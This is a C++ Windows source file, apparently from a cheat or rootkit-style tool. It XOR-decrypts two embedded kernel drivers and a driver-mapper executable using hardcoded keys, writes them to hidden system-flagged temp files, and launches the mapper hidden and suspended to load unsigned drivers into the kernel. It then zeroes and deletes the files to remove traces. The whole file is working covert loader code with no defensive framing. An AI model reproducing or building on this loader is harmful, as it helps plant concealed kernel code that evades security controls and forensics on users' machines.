#include "driver_loader.hpp"
#include "whoswho_encrypted.h"
#include "sentinel_encrypted.h"
#include "windmapper_embedded.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <bcrypt.h>
#include <cstdio>
#include <cstring>
#include <string>

#pragma comment(lib, "bcrypt.lib")

namespace
{
    static constexpr unsigned char WHOSWHO_KEY[] = {
        0xA3, 0x5F, 0x17, 0xD2, 0x8B, 0x64, 0xE9, 0x31,
        0xCC, 0x4A, 0x76, 0xF0, 0x0E, 0x93, 0xB8, 0x2D
    };

    static constexpr unsigned char SENTINEL_KEY[] = {
        0xD7, 0x2B, 0x83, 0x4E, 0xF1, 0x69, 0xA5, 0x1C,
        0x38, 0xE0, 0x54, 0x9F, 0x7A, 0xC6, 0x0D, 0xB2
    };

    static constexpr unsigned char MAPPER_KEY[] = {
        0x91, 0x3C, 0xAE, 0x57, 0xF8, 0x22, 0xD4, 0x6B,
        0x15, 0xC9, 0x83, 0x4F, 0xBA, 0x60, 0x7E, 0xE3
    };

    bool g_loaded = false;


    bool verify_blob_integrity(const unsigned char* data, unsigned long size,
                               unsigned long expected_size)
    {
        if (size != expected_size)
            return false;
        if (size < 2 || data[0] != 'M' || data[1] != 'Z')
            return false;


        if (size < 64)
            return false;
        uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
        if (e_lfanew >= size - 4)
            return false;

        if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
            data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
            return false;

        return true;
    }

    std::wstring get_temp_sys_path()
    {
        wchar_t tmp[MAX_PATH] = {};
        if (!GetTempPathW(MAX_PATH, tmp))
            return {};
        wchar_t file[MAX_PATH] = {};
        if (!GetTempFileNameW(tmp, L"drv", 0, file))
            return {};

        std::wstring path(file);
        DeleteFileW(path.c_str());
        path += L".sys";
        return path;
    }

    bool decrypt_and_write(const unsigned char* enc, unsigned long enc_size,
                           const unsigned char* key, size_t key_len,
                           const std::wstring& out_path)
    {
        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, enc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf)
            return false;

        for (unsigned long i = 0; i < enc_size; ++i)
            buf[i] = enc[i] ^ key[i % key_len];

        if (!verify_blob_integrity(buf, enc_size, enc_size)) {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        HANDLE hf = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, enc_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, enc_size, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, enc_size);
        VirtualFree(buf, 0, MEM_RELEASE);

        return ok && written == enc_size;
    }

    std::wstring write_embedded_mapper()
    {
        wchar_t tmp[MAX_PATH] = {};
        if (!GetTempPathW(MAX_PATH, tmp))
            return {};
        wchar_t file[MAX_PATH] = {};
        if (!GetTempFileNameW(tmp, L"map", 0, file))
            return {};

        std::wstring path(file);
        DeleteFileW(path.c_str());
        path += L".exe";


        auto* buf = static_cast<unsigned char*>(
            VirtualAlloc(nullptr, g_windmapper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!buf)
            return {};

        for (unsigned long i = 0; i < g_windmapper_size; ++i)
            buf[i] = g_windmapper_data[i] ^ MAPPER_KEY[i % sizeof(MAPPER_KEY)];

        if (!verify_blob_integrity(buf, g_windmapper_size, g_windmapper_size)) {
            SecureZeroMemory(buf, g_windmapper_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return {};
        }

        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS,
                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY |
                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
        if (hf == INVALID_HANDLE_VALUE) {
            SecureZeroMemory(buf, g_windmapper_size);
            VirtualFree(buf, 0, MEM_RELEASE);
            return {};
        }

        DWORD written = 0;
        BOOL ok = WriteFile(hf, buf, g_windmapper_size, &written, nullptr);
        FlushFileBuffers(hf);
        CloseHandle(hf);
        SecureZeroMemory(buf, g_windmapper_size);
        VirtualFree(buf, 0, MEM_RELEASE);

        if (!ok || written != g_windmapper_size) {
            DeleteFileW(path.c_str());
            return {};
        }

        return path;
    }

    void secure_delete(const std::wstring& path)
    {
        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER size;
            if (GetFileSizeEx(hf, &size) && size.QuadPart > 0) {
                auto* zeros = static_cast<unsigned char*>(
                    VirtualAlloc(nullptr, static_cast<SIZE_T>(size.QuadPart),
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
                if (zeros) {
                    DWORD written = 0;
                    WriteFile(hf, zeros, static_cast<DWORD>(size.QuadPart), &written, nullptr);
                    FlushFileBuffers(hf);
                    VirtualFree(zeros, 0, MEM_RELEASE);
                }
            }
            CloseHandle(hf);
        }
        DeleteFileW(path.c_str());
    }
}

namespace driver_loader
{
    bool is_driver_loaded()
    {
        return g_loaded;
    }

    bool initialize_and_load()
    {
        if (g_loaded)
            return true;

        std::wstring mapper_path = write_embedded_mapper();
        if (mapper_path.empty())
            return false;

        std::wstring whoswho_path = get_temp_sys_path();
        std::wstring sentinel_path = get_temp_sys_path();
        if (whoswho_path.empty() || sentinel_path.empty()) {
            secure_delete(mapper_path);
            return false;
        }

        if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
                               WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
            secure_delete(mapper_path);
            return false;
        }

        if (!decrypt_and_write(g_sentinel_encrypted, g_sentinel_encrypted_size,
                               SENTINEL_KEY, sizeof(SENTINEL_KEY), sentinel_path)) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            return false;
        }

        SetFileAttributesW(whoswho_path.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        SetFileAttributesW(sentinel_path.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

        std::wstring cmdline = L"\"" + mapper_path + L"\" \"" +
                               whoswho_path + L"\" \"" + sentinel_path + L"\"";

        STARTUPINFOW si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        BOOL created = CreateProcessW(
            mapper_path.c_str(),
            &cmdline[0],
            nullptr, nullptr,
            FALSE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            nullptr, nullptr,
            &si, &pi);

        if (!created) {
            secure_delete(mapper_path);
            secure_delete(whoswho_path);
            secure_delete(sentinel_path);
            return false;
        }


        HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags =
                JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
                JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                    &jeli, sizeof(jeli));
            AssignProcessToJobObject(hJob, pi.hProcess);
        }

        ResumeThread(pi.hThread);

        WaitForSingleObject(pi.hProcess, 90000);

        DWORD exit_code = 1;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (hJob)
            CloseHandle(hJob);

        secure_delete(mapper_path);
        secure_delete(whoswho_path);
        secure_delete(sentinel_path);

        if (exit_code != 0)
            return false;

        g_loaded = true;
        return true;
    }
}
